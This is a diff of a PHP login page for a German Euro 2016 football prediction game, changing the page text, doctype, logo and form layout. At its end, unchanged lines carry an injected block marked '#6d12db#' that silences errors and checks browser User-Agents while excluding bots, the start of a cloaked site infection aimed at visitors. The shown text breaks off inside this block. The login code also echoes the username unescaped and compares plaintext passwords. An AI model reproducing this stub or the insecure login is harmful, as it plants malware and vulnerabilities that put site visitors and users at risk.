@@ -38,7 +38,7 @@ else
 		$password=$array1["password"];
 		$userId=$array1["userid"];
 		
-		// Passwort überprüfen
+		// Passwort ueberpruefen
 		if($_POST["password"] != $password)
 		{
 			echo "<br>Falsches Passwort. Bitte Eingabe korrigieren.";
@@ -59,39 +59,51 @@ else
 		}
 	}
 	
-	//Datenbankconnection schließen
+	//Datenbankconnection schliessen
 	mysql_close();
 }
 
 function promptLogin($username){
 	?>
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//DE"
-            "http://www.w3.org/TR/html4/loose.dtd">
+<!DOCTYPE html>
 <html>
 <head>
-<link rel='stylesheet' type='text/css' href='../../style/style.css' />
-<title>Werkes WM-Tipp Login </title>
+<link rel='stylesheet' type='text/css' href='../../style/style-EM2016.css' />
+<title>Werke's Tippspiel - Login</title>
 </head>
 <body>
+
 <center>
-<p><img src="../pics/WerkesWM_WebTipp_2014_Klein.png" alt="WM2014-Logo"></p>
-<br>
-<br>
+
+<h1>Werke's Tippspiel zur Europameisterschaft 2016 in Frankreich</h1>
+<p><img src="../pics/Logo_EM_2016.png" class="image" width="400" alt="Logo_EM_2016">
+
+<div class="block">
+  	<h1><font color="#ffffff">Login</font></h1>
 <?php 
 	echo "<table>";
 	echo "<form method='POST' action='login.php5'>";
 	echo "<tr>";
-	echo "<td>Benutzername:</td><td>	<input type='text' size='50' name='username' value='$username'></td>";
+	echo "<td>Benutzername</td>";
 	echo "</tr>";
 	echo "<tr>";
-	echo "<td>Passwort :</td><td>	<input type='password' size='50' name='password' value=''></td>";
+	echo "<td> <input type='text' size='35' name='username' value='$username'></td>";
 	echo "</tr>";
 	echo "<tr>";
-	echo "<td></td><td><input type='submit' name='login' value='Einloggen'></td>";
+	echo "<td>Passwort </td>";
+	echo "</tr>";
+	echo "<tr>";
+	echo "<td><input type='password' size='35' name='password' value=''></td>";
+	echo "</tr>";
+	echo "<tr>";
+	echo "<td><input type='submit' name='login' value='Anmelden'></td>";
 	echo "</tr>";
 	echo "</table>";
 	}
 ?>
+</p>
+</div>
+
 <?php
 #6d12db#
 error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
